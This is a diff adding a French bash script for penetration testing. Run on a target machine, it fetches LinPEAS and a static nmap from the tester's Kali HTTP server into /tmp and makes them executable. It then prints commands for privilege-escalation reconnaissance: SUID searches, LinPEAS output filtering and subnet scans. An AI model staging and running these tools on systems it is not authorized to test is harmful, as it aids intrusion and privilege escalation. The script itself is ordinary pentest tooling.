@@ -1,0 +1,243 @@
+#!/bin/bash
+# ============================================================================
+# SCRIPT DE TÉLÉCHARGEMENT OUTILS - À EXÉCUTER SUR LA CIBLE
+# Télécharge nmap + linpeas depuis serveur HTTP Kali
+# Usage: ./download_tools.sh <KALI_IP> [PORT]
+# ============================================================================
+
+# Couleurs
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+
+# Configuration
+KALI_IP="${1}"
+HTTP_PORT="${2:-8080}"
+WORK_DIR="/tmp/pentest_$(date +%s)"
+
+log() { echo -e "${GREEN}[+]${NC} $1"; }
+log_error() { echo -e "${RED}[-]${NC} $1"; }
+log_info() { echo -e "${BLUE}[*]${NC} $1"; }
+log_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
+
+banner() {
+    echo -e "${CYAN}"
+    cat << "EOF"
+╔══════════════════════════════════════════════════════════════╗
+║         TÉLÉCHARGEMENT NMAP + LINPEAS (SANS SUDO)          ║
+╚══════════════════════════════════════════════════════════════╝
+EOF
+    echo -e "${NC}"
+}
+
+show_usage() {
+    echo "Usage: $0 <KALI_IP> [PORT]"
+    echo ""
+    echo "Arguments:"
+    echo "  KALI_IP    IP de ta machine Kali (obligatoire)"
+    echo "  PORT       Port du serveur HTTP (défaut: 8080)"
+    echo ""
+    echo "Exemples:"
+    echo "  $0 192.168.1.10"
+    echo "  $0 192.168.1.10 8080"
+    echo "  $0 192.168.1.10 9000"
+    echo ""
+    echo "Avant d'exécuter ce script:"
+    echo "  Sur Kali: cd <dossier_avec_outils> && python3 -m http.server 8080"
+    exit 1
+}
+
+# Vérification arguments
+if [ -z "$KALI_IP" ]; then
+    log_error "IP Kali manquante"
+    echo ""
+    show_usage
+fi
+
+# Détection méthode download
+detect_download_tool() {
+    if command -v wget &> /dev/null; then
+        DL_TOOL="wget"
+        DL_CMD="wget -q --show-progress"
+        log_info "Utilisation de wget"
+    elif command -v curl &> /dev/null; then
+        DL_TOOL="curl"
+        DL_CMD="curl -# -O"
+        log_info "Utilisation de curl"
+    else
+        log_error "Aucun outil de téléchargement disponible (wget ou curl requis)"
+        exit 1
+    fi
+}
+
+# Création workspace
+create_workspace() {
+    log_info "Création workspace: $WORK_DIR"
+    
+    if ! mkdir -p "$WORK_DIR"; then
+        log_error "Impossible de créer $WORK_DIR"
+        log_warning "Tentative avec /tmp uniquement..."
+        WORK_DIR="/tmp"
+    fi
+    
+    cd "$WORK_DIR" || exit 1
+    log "Workspace: $WORK_DIR"
+}
+
+# Test connexion serveur HTTP
+test_http_server() {
+    log_info "Test connexion serveur HTTP..."
+    
+    local test_url="http://$KALI_IP:$HTTP_PORT/"
+    
+    if command -v curl &> /dev/null; then
+        if curl -sf "$test_url" > /dev/null 2>&1; then
+            log "Serveur HTTP accessible ✓"
+            return 0
+        fi
+    elif command -v wget &> /dev/null; then
+        if wget -q --spider "$test_url" 2>/dev/null; then
+            log "Serveur HTTP accessible ✓"
+            return 0
+        fi
+    fi
+    
+    log_error "Serveur HTTP non accessible sur http://$KALI_IP:$HTTP_PORT/"
+    log_warning "Vérifier que le serveur HTTP tourne sur Kali:"
+    echo "          python3 -m http.server $HTTP_PORT"
+    exit 1
+}
+
+# Téléchargement LinPEAS
+download_linpeas() {
+    log_info "Téléchargement LinPEAS..."
+    
+    local url="http://$KALI_IP:$HTTP_PORT/linpeas.sh"
+    
+    if $DL_CMD "$url"; then
+        if [ -f "linpeas.sh" ]; then
+            chmod +x linpeas.sh
+            local size=$(du -h linpeas.sh | cut -f1)
+            log "LinPEAS téléchargé ✓ ($size)"
+            return 0
+        fi
+    fi
+    
+    log_error "Échec téléchargement LinPEAS"
+    log_warning "Vérifier que linpeas.sh existe dans le dossier du serveur HTTP"
+    return 1
+}
+
+# Téléchargement Nmap
+download_nmap() {
+    log_info "Téléchargement Nmap statique..."
+    
+    local url="http://$KALI_IP:$HTTP_PORT/nmap"
+    
+    if $DL_CMD "$url"; then
+        if [ -f "nmap" ]; then
+            chmod +x nmap
+            local size=$(du -h nmap | cut -f1)
+            log "Nmap téléchargé ✓ ($size)"
+            
+            # Test nmap
+            if ./nmap --version &> /dev/null; then
+                local version=$(./nmap --version | head -1)
+                log_info "Nmap fonctionnel: $version"
+            else
+                log_warning "Nmap téléchargé mais test version échoué"
+            fi
+            return 0
+        fi
+    fi
+    
+    log_error "Échec téléchargement Nmap"
+    log_warning "Vérifier que nmap existe dans le dossier du serveur HTTP"
+    return 1
+}
+
+# Afficher résumé
+show_summary() {
+    echo ""
+    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${CYAN}║                         RÉSUMÉ                               ║${NC}"
+    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
+    echo ""
+    echo -e "${GREEN}Workspace:${NC} $WORK_DIR"
+    echo ""
+    echo -e "${GREEN}Fichiers disponibles:${NC}"
+    ls -lh "$WORK_DIR" 2>/dev/null | grep -v "^total\|^d"
+    echo ""
+}
+
+# Instructions utilisation
+show_usage_instructions() {
+    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${CYAN}║                    COMMANDES D'UTILISATION                   ║${NC}"
+    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
+    echo ""
+    
+    echo -e "${YELLOW}# Se déplacer dans le workspace:${NC}"
+    echo -e "${GREEN}cd $WORK_DIR${NC}"
+    echo ""
+    
+    echo -e "${YELLOW}# Exécuter LinPEAS:${NC}"
+    echo -e "${GREEN}./linpeas.sh | tee linpeas_output.txt${NC}"
+    echo ""
+    
+    echo -e "${YELLOW}# Analyser sortie LinPEAS:${NC}"
+    echo -e "${GREEN}cat linpeas_output.txt | grep 'rwsr' | grep -i python${NC}"
+    echo ""
+    
+    echo -e "${YELLOW}# Exécuter Nmap (sans sudo, scan TCP):${NC}"
+    echo -e "${GREEN}./nmap -sT -F localhost${NC}"
+    echo -e "${GREEN}./nmap -sT -p 22,80,443 192.168.1.0/24${NC}"
+    echo ""
+    
+    echo -e "${YELLOW}# Chercher binaires SUID manuellement:${NC}"
+    echo -e "${GREEN}find / -perm -4000 -type f 2>/dev/null${NC}"
+    echo ""
+}
+
+# Sauvegarder path
+save_workspace_path() {
+    echo "$WORK_DIR" > /tmp/pentest_workspace_path.txt
+    log_info "Path sauvegardé dans: /tmp/pentest_workspace_path.txt"
+}
+
+# Main
+main() {
+    banner
+    
+    echo -e "${BLUE}[*]${NC} Cible: $(hostname) ($(whoami))"
+    echo -e "${BLUE}[*]${NC} Serveur HTTP: http://$KALI_IP:$HTTP_PORT/"
+    echo ""
+    
+    detect_download_tool
+    test_http_server
+    
+    echo ""
+    create_workspace
+    
+    echo ""
+    download_linpeas
+    
+    echo ""
+    download_nmap
+    
+    echo ""
+    save_workspace_path
+    
+    show_summary
+    show_usage_instructions
+    
+    echo ""
+    echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}${BOLD}║                   TÉLÉCHARGEMENT TERMINÉ ✓                   ║${NC}"
+    echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
+}
+
+main "$@"
